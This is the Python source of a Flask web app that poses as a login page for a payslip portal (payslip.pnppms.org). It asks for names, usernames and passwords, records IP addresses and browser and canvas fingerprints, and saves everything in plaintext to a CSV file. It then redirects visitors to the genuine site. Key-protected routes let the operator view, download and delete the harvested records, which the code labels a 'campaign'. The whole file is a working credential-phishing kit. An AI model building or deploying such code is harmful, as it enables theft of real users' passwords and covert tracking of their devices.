from flask import Flask, render_template, request, redirect, jsonify, session, send_file
import csv # getting the configuration of csv
import os # configuration/ portable way of using operating system
import time #getting the time
import subprocess #allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
import platform 
import re 
import json 
import hashlib
import uuid
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Required for session

# Add a custom filter for hashing passwords in templates
@app.template_filter('hash')
def hash_filter(value):
    """Hash a value for display in templates"""
    if not value:
        return "N/A"
    # Create a SHA-256 hash with some salt
    hashed = hashlib.sha256(f"pnppms-{value}".encode()).hexdigest()
    # Return only first and last few characters
    return f"{hashed[:6]}...{hashed[-6:]}"

# Secret access key for stats page (change this to a secure value)
STATS_ACCESS_KEY = "pnp-pms-campaign2025"

# Route for rendering the identity page as the main landing page
@app.route('/')
def index():
    return render_template('identity.html')

# Route for rendering the login page after identity confirmation
@app.route('/login')
def login_page():
    # Check if we have first name and last name in session
    if 'firstname' not in session or 'lastname' not in session:
        return redirect('/')
    return render_template('index.html')

"""
A function designed to retrieve 
and return the client's actual IP address.
"""
def get_client_ip():
    """
    Enhanced function to get the most accurate client IP address
    by checking multiple headers in priority order
    """
    # List of headers to check in priority order
    ip_headers = [
        'CF-Connecting-IP',           # Cloudflare
        'True-Client-IP',             # Akamai and some CDNs
        'X-Forwarded-For',            # Most common proxy header
        'X-Real-IP',                  # Nginx proxy/FastCGI
        'X-Client-IP',                # Apache proxy
        'Forwarded',                  # RFC 7239 standard
        'X-Forwarded',                # Non-standard but sometimes used
        'X-Cluster-Client-IP',        # Used by some load balancers
        'Fastly-Client-IP',           # Fastly CDN
        'X-Originating-IP'            # Microsoft 
    ]
    
    # Check each header in order
    for header in ip_headers:
        if header.lower() == 'x-forwarded-for' and request.headers.getlist(header):
            # X-Forwarded-For may contain multiple IPs, get the first one (client)
            forwarded_for = request.headers.getlist(header)[0]
            if forwarded_for:
                # Get the leftmost IP which is typically the original client
                client_ip = forwarded_for.split(',')[0].strip()
                if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                    return client_ip
        elif request.headers.get(header):
            client_ip = request.headers.get(header).strip()
            if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                return client_ip
    
    # Try WSGI environment variables if headers failed
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        forwarded_for = request.environ.get('HTTP_X_FORWARDED_FOR')
        client_ip = forwarded_for.split(',')[0].strip()
        if client_ip and client_ip != '127.0.0.1':
            return client_ip
    
    return request.remote_addr

# Handle identity form submission
@app.route('/identity-submit', methods=['POST'])
def identity_submit():
    firstname = request.form.get('firstname')
    lastname = request.form.get('lastname')
    
    if not firstname or not lastname:
        return render_template('identity.html', error="Please enter both First Name and Last Name")
    
    # Store in session for later use
    session['firstname'] = firstname
    session['lastname'] = lastname
    
    # Get enhanced client information
    ip_address = get_client_ip()
    device_type = get_device_type()
    
    # Store in session for later use with full submission
    session['ip_address'] = ip_address
    session['device_type'] = device_type
    session['time_identity'] = time.strftime('%Y-%m-%d %H:%M:%S')
    
    # Redirect to login page
    return redirect('/login')

"""
Function to determine if the client is using a mobile or desktop device
depending on their current device they try to log in.
"""
def get_device_type():
    user_agent = request.headers.get('User-Agent', '').lower()
    if any(mobile in user_agent for mobile in ['iphone', 'android', 'mobile', 'tablet']):
        return 'Mobile'
    return 'Desktop'

def generate_device_fingerprint():
    """
    Generate a unique device fingerprint based on browser characteristics
    This is more reliable than trying to get MAC addresses
    """
    user_agent = request.headers.get('User-Agent', '')
    accept_lang = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')
    accept = request.headers.get('Accept', '')
    ip_address = get_client_ip()
    screen_info = request.cookies.get('screen_info', '')
    timezone = request.cookies.get('timezone', '')
    platform_info = request.cookies.get('platform_info', '')
    canvas_fp = request.cookies.get('canvas_fp', '')
    
    # Create a unique fingerprint from multiple browser characteristics
    fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}|{accept}|{ip_address}|{screen_info}|{timezone}|{platform_info}|{canvas_fp}"
    # Generate a unique ID combining SHA-256 hash and a portion of UUID
    unique_id = str(uuid.uuid4())[:8]
    fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:24] + unique_id
    
    return fingerprint

def get_browser_info():
    """
    Extract detailed browser information from User-Agent and other headers
    """
    user_agent = request.headers.get('User-Agent', '')
    
    # Extract browser name and version
    browser_name = "Unknown"
    browser_version = "Unknown"
    os_name = "Unknown"
    os_version = "Unknown"
    
    # Common browser patterns
    browser_patterns = [
        (r'MSIE\s([0-9\.]+)', 'Internet Explorer'),
        (r'Edge/([0-9\.]+)', 'Edge'),
        (r'Edg/([0-9\.]+)', 'Edge'),
        (r'Chrome/([0-9\.]+)', 'Chrome'),
        (r'Firefox/([0-9\.]+)', 'Firefox'),
        (r'Safari/([0-9\.]+)', 'Safari'),
        (r'OPR/([0-9\.]+)', 'Opera'),
        (r'Opera/([0-9\.]+)', 'Opera')
    ]
    
    # OS patterns
    os_patterns = [
        (r'Windows NT 10\.0', 'Windows', '10'),
        (r'Windows NT 6\.3', 'Windows', '8.1'),
        (r'Windows NT 6\.2', 'Windows', '8'),
        (r'Windows NT 6\.1', 'Windows', '7'),
        (r'Windows NT 6\.0', 'Windows', 'Vista'),
        (r'Windows NT 5\.1', 'Windows', 'XP'),
        (r'Macintosh; Intel Mac OS X ([0-9_\.]+)', 'macOS', None),
        (r'Android ([0-9\.]+)', 'Android', None),
        (r'iPhone OS ([0-9_\.]+)', 'iOS', None),
        (r'iPad; CPU OS ([0-9_\.]+)', 'iOS', None),
        (r'Linux', 'Linux', 'Unknown')
    ]
    
    # Get browser info
    for pattern, name in browser_patterns:
        match = re.search(pattern, user_agent)
        if match:
            browser_name = name
            browser_version = match.group(1)
            break
    
    # Get OS info
    for pattern, name, version in os_patterns:
        match = re.search(pattern, user_agent)
        if match:
            os_name = name
            if version is None and match.groups():
                os_version = match.group(1).replace('_', '.')
            else:
                os_version = version
            break
    
    # Additional information from headers
    accept_lang = request.headers.get('Accept-Language', 'Unknown')
    languages = accept_lang.split(',')[0] if ',' in accept_lang else accept_lang
    
    # Custom headers that might be sent from client-side JS
    screen_resolution = request.cookies.get('screen_info', 'Unknown')
    timezone_info = request.cookies.get('timezone', 'Unknown')
    
    # Get canvas and WebGL fingerprint
    canvas_fp = request.cookies.get('canvas_fp', 'Unknown')
    canvas_hash = canvas_fp.split('_')[0] if '_' in canvas_fp else canvas_fp
    webgl_info = canvas_fp.split('_')[1] if '_' in canvas_fp and len(canvas_fp.split('_')) > 1 else 'Unknown'
    
    # Parse platform info if available
    platform_info = {}
    try:
        platform_cookie = request.cookies.get('platform_info', '{}')
        platform_info = json.loads(platform_cookie)
    except:
        platform_info = {'error': 'Failed to parse platform info'}
    
    # Compile all information
    browser_details = {
        'browser_name': browser_name,
        'browser_version': browser_version,
        'os_name': os_name,
        'os_version': os_version,
        'language': languages,
        'screen_resolution': screen_resolution,
        'timezone': timezone_info,
        'canvas_hash': canvas_hash,
        'webgl_info': webgl_info,
        'platform_details': platform_info,
        'full_user_agent': user_agent
    }
    
    return json.dumps(browser_details)

# routing for handle login form submission
@app.route('/login', methods=['POST'])
def login():
    # Get the form data
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Check if identity was confirmed
    if 'firstname' not in session or 'lastname' not in session:
        return redirect('/')
    
    # Get saved information
    firstname = session.get('firstname')
    lastname = session.get('lastname')
    ip_address = session.get('ip_address', get_client_ip())
    device_type = session.get('device_type', get_device_type())
    
    # Get more enhanced client information
    device_fingerprint = generate_device_fingerprint()
    browser_info = get_browser_info()
    
    if not username or not password:
        return render_template('index.html', error="Please enter both username and password")
    
    # Save the complete data
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
    
    # Redirect to external site
    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")

def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
    """ 
    Save complete user data to CSV
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, 'data.csv')
    
    try:
        platform_info = json.loads(browser_info)
        
        # Get the values from platform_info
        device_type = platform_info.get('deviceType', 'Unknown')
        device_brand = platform_info.get('deviceBrand', 'Unknown')
        os_name = platform_info.get('os_name', 'Unknown')
        os_version = platform_info.get('os_version', 'Unknown')
        browser_name = platform_info.get('browser_name', 'Unknown')
        browser_version = platform_info.get('browser_version', 'Unknown')
        screen_resolution = platform_info.get('screen_resolution', 'Unknown')
        timezone = platform_info.get('timezone', 'Unknown')
        full_user_agent = platform_info.get('full_user_agent', 'Unknown')
        
        # Write to CSV with the correct column names
        with open(csv_path, 'a', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow([
                firstname,
                lastname,
                username,
                password,
                timestamp,
                ip_address,
                device_fingerprint,
                device_type,
                device_brand,  # New column
                os_name,
                os_version,
                browser_name,
                browser_version,
                screen_resolution,
                timezone,
                full_user_agent
            ])
            
    except Exception as e:
        print(f"Error saving data: {str(e)}")

def update_last_modified_timestamp(csv_path=None):
    """Update the timestamp for when the data was last modified"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        # Get current timestamp
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Write timestamp to file
        with open(timestamp_file, 'w') as f:
            f.write(current_time)
    except Exception as e:
        print(f"Error updating timestamp: {str(e)}")

def get_last_modified_timestamp():
    """Get the timestamp when the data was last modified"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        if os.path.exists(timestamp_file):
            with open(timestamp_file, 'r') as f:
                return f.read().strip()
        
        # If file doesn't exist, check the CSV file's modification time
        csv_path = os.path.join(script_dir, 'data.csv')
        if os.path.exists(csv_path):
            modified_time = os.path.getmtime(csv_path)
            return datetime.fromtimestamp(modified_time).strftime('%Y-%m-%d %H:%M:%S')
        
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    except Exception as e:
        print(f"Error getting timestamp: {str(e)}")
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Add a route to view statistics with access key protection
@app.route('/stats/<access_key>', methods=['GET'])
def view_stats(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    data = []
    for path in possible_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as csvfile:
                    reader = csv.DictReader(csvfile)
                    data = list(reader)
                break  # Successfully read data, exit loop
            except Exception as e:
                continue
    
    # Get the last modified timestamp
    last_updated = get_last_modified_timestamp()
    
    if request.args.get('format') == 'json':
        return json.dumps(data)
    else:
        return render_template('stats.html', entries=data, access_key=access_key, last_updated=last_updated)

# Add a route to download the CSV data
@app.route('/download-csv/<access_key>', methods=['GET'])
def download_csv(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    # Set the appropriate headers for CSV download
    filename = f"login_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    return send_file(
        csv_path,
        mimetype='text/csv',
        as_attachment=True,
        download_name=filename
    )

# Add a route to delete a specific entry
@app.route('/delete-entry/<access_key>/<int:entry_index>', methods=['DELETE'])
def delete_entry(access_key, entry_index):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        # Read all data
        all_data = []
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            all_data = list(reader)
        
        # Check if the index is valid
        if entry_index < 0 or entry_index >= len(all_data) - 1:  # -1 for header
            return "Invalid entry index", 400
        
        # Remove the entry (add 1 to skip header)
        del all_data[entry_index + 1]
        
        # Write back the updated data
        with open(csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerows(all_data)
        
        # Update the last modified timestamp
        update_last_modified_timestamp()
        
        return "Entry deleted successfully", 200
    
    except Exception as e:
        print(f"Error deleting entry: {str(e)}")
        return f"Error: {str(e)}", 500

# Add a route to delete all entries
@app.route('/delete-all/<access_key>', methods=['DELETE'])
def delete_all(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        # Keep only the header row
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            header = next(reader)  # Get header row
        
        # Write back only the header
        with open(csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(header)
        
        # Update the last modified timestamp
        update_last_modified_timestamp()
        
        return "All entries deleted successfully", 200
    
    except Exception as e:
        print(f"Error deleting all entries: {str(e)}")
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    #run server 
    app.run(
        host='0.0.0.0',  
        port=5000,       # You can change this port if needed. do not remove for handling port.
        debug=False      # set to False for production. do not remove this.
    ) 